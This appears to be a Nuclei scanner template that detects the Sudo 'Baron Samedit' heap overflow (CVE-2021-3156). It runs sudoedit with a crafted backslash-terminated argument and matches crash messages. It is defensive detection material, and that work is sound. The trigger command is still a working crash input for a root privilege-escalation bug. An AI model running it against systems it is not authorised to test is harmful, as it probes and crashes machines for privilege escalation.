code:
- engine:
  - sh
  - bash
  matchers:
  - condition: and
    type: word
    words:
    - 'malloc(): memory corruption'
    - Aborted (core dumped)
  source: 'sudoedit -s ''\'' $(python3 -c ''print("A"*1000)'')

    '
id: CVE-2021-3156
info:
  author: pussycat0x
  description: 'Sudo before 1.9.5p2 contains an off-by-one error that can result in
    a heap-based buffer overflow, which allows privilege escalation to root via "sudoedit
    -s" and a command-line argument that ends with a single backslash character.

    '
  metadata:
    verified: true
  name: Sudo Baron Samedit - Local Privilege Escalation
  reference:
  - https://medium.com/mii-cybersec/privilege-escalation-cve-2021-3156-new-sudo-vulnerability-4f9e84a9f435
  - https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit
  - https://infosecwriteups.com/baron-samedit-cve-2021-3156-tryhackme-76d7dedc3cff
  severity: high
  tags: cve,cve2021,sudo,code,linux,privesc,local,kev
self-contained: true
